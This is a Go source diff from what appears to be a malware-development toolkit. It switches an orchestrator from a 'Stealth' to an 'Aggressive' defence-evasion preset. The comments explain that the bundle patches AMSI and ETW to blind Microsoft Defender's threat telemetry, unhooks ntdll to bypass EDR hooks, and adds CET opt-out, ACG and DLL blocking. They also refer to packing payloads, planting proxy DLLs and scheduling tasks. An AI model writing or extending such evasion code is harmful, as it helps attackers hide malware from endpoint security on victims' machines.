@@ -7,28 +7,31 @@ import (
 	"github.com/oioio-space/maldev/evasion/preset"
 )
 
-// applyEvasion runs the evasion/preset.Stealth() bundle in THIS
-// process: patches AMSI ScanBuffer + ETW user-mode write helpers +
-// selective ntdll unhook for ~10 commonly-hooked NT functions.
+// applyEvasion runs the evasion/preset.Aggressive() bundle in THIS
+// process. Aggressive layers on top of Stealth (AMSI + ETW + ntdll
+// unhook):
 //
-// Why Stealth specifically:
-//   - AMSI patch: short-circuits in-process script scans (mostly a
-//     dog-food demonstration here -- spawned PowerShell children
-//     load their own amsi.dll fresh).
-//   - ETW patch: blinds Microsoft-Windows-Threat-Intelligence ETW
-//     events. Defender's behavioural analysis subscribes to that
-//     channel; without it, our long-lived orchestrator process
-//     loses a major behavioural-telemetry signal.
-//   - ntdll unhook: restores original prologue bytes of NtAlloc /
-//     NtCreateThread / NtProtect / NtWrite ... that EDRs inline-
-//     hook to redirect to their own callbacks. Our packer + plant
-//     calls go straight to the kernel after this.
+//   - CET opt-out — relaxes shadow-stack enforcement before later
+//     RWX work happens elsewhere.
+//   - ACG (Arbitrary Code Guard) — no new PAGE_EXECUTE allocations
+//     after this point.
+//   - BlockDLLs (MicrosoftOnly) — `LoadLibrary` of non-MS-signed
+//     DLLs is denied for the rest of the process lifetime.
 //
-// We deliberately stop short of preset.Aggressive (which adds ACG
-// + BlockDLLs) because the orchestrator still LoadLibrary's some
-// non-MS DLLs (debug, instrumentation) and ACG would block our
-// own subsequent VirtualAlloc(PAGE_EXECUTE) if any code path
-// needs RWX.
+// Order-of-ops audit (slice 9.8.b):
+//
+//   - The bundle order inside Aggressive() is
+//     amsi → etw → unhook → CET → acg → blockdlls. ntdll unhook
+//     finishes its VirtualProtect dance BEFORE ACG kicks in, so the
+//     evasion bundle does not shoot itself in the foot.
+//   - The orchestrator is pure-Go after evasion: PackBinary /
+//     PackProxyDLLFromTarget operate on byte slices, no
+//     VirtualAlloc(PAGE_EXECUTE). os.WriteFile + scheduled-task
+//     scheduling is pure syscalls.
+//   - No runtime non-MS LoadLibrary in the orchestrator — the only
+//     LoadLibrary'd DLLs are ole32 / oleaut32 (COM activation in
+//     dllhijack.ScanScheduledTasks), all MS-signed, so BlockDLLs
+//     does not deny them.
 //
 // Returns nil on full success, an aggregate error otherwise.
 // Failures are folded by [evasion.ApplyAllAggregated] into a single
@@ -36,5 +39,5 @@ import (
 // abort: the orchestrator works without evasion, this is
 // defence-in-depth.
 func patchAMSI() error {
-	return evasion.ApplyAllAggregated(preset.Stealth(), nil)
+	return evasion.ApplyAllAggregated(preset.Aggressive(), nil)
 }
